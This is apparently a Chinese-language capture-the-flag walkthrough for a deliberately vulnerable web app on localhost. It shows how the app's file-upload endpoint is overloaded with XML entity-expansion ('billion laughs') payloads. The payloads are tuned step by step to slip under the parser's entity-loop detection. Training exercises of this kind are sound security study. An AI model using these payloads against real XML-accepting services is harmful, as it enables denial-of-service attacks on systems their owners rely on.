---
title: XXE Data Access
description: 使用提交 xml 格式文件的端点，上传文件，已知此处拥有 XXE 漏洞。使用 DTD 实体引用循环，增加初始字符串长度以及实体引用数量。
---

- 描述：让服务器有东西可做相当长的一段时间。
- 关联挑战 XXE Data Access 与 Deprecated Interface 发现可上传 XML 文件的端点
    ```http://127.0.0.1:3000/#/complain```
    上传文件端点为
    ```POST /file-upload HTTP/1.1```
- 尝试 DTD 引用循环
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;">
    ]>
    <lolz>&lol3;</lolz>
    ```
    直到```lol3```前仍可返回，```lol3```的响应为
    ```
    Detected an entity reference loop
    ```
- 修改 DTD 引用，在不触发引用循环限制的情况下，增加初始字符串长度以及实体引用数量
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY lol "lollollollol...lollollollol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    ]>
    <lolz>&lol2;&lol2;&lol2;...&lol2;&lol2;&lol2;</lolz>
    ```
    逐渐增加，直到通过挑战